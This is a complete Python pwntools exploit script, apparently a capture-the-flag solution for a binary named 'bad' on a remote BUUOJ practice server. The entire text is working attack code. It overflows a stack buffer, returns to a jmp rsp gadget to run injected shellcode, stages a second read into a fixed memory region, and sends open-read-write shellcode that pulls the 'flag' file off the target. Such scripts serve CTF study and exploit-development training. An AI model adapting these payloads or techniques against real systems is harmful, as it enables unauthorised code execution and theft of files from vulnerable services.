from pwn import *


# p = process("./bad")
p = remote("node4.buuoj.cn", 28343)

context(os="linux", arch="amd64")

# orw
jmp_rsp = 0x00400A01 
mmap = 0x123000
bss_addr = 0x06010A9

code = shellcraft.open("flag")
code += shellcraft.read(3, bss_addr, 0x50)
code += shellcraft.write(1, bss_addr, 0x50)
code = asm(code)

pad = asm(shellcraft.read(0, mmap, 0x100))+asm("mov rax, 0x123000; call rax")
pad = pad.ljust(0x28, b"\x00")
pad += p64(jmp_rsp)+asm("sub rsp, 0x30; call rsp")
pad = pad.ljust(0x38, b"\x00")
p.send(pad)
p.send(code)

p.interactive()


